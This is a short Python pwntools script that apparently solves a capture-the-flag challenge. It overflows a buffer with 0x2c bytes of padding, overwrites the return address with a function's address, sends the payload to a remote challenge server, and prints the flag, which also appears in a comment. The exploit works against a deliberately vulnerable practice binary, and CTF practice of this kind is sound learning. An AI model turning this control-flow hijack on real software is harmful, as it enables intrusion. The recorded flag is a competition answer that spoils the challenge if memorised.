#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./first_visit", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("chals1.apoorvctf.xyz", 3001)

payload = b"A" * 0x2c
payload += p32(elf.symbols["brew_coffee"])

p.sendline(payload)

p.readuntil(b"blend.'\n")

flag = p.readline().decode()[:-1]
print(flag) # apoorvctf{c0ffee_buff3r_sp1ll}
